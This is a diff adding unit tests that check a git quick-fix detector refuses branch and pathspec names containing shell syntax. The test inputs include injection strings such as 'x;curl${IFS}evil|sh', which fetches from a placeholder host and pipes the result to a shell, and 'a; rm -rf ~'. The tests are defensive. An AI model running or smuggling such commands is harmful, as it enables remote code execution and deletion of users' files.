@@ -28,6 +28,21 @@ describe("detectQuickFixes", () => {
       url: "https://github.com/a/b/pull/new/dev",
     });
   });
+
+  it("skips the upstream fix when the branch name carries shell syntax", () => {
+    const output = "    git push --set-upstream origin x;curl${IFS}evil|sh\n";
+    expect(detectQuickFixes("git push", output, 128)).toEqual([]);
+  });
+
+  it("offers to create a branch for a safe pathspec only", () => {
+    const fixes = (name: string) => detectQuickFixes(
+      "git checkout feat",
+      `error: pathspec '${name}' did not match any file(s) known to git`,
+      1,
+    );
+    expect(fixes("feature/a-1.2")[0]).toMatchObject({ command: "git checkout -b feature/a-1.2" });
+    expect(fixes("a; rm -rf ~")).toEqual([]);
+  });
 });
 
 describe("detectPortInUse", () => {
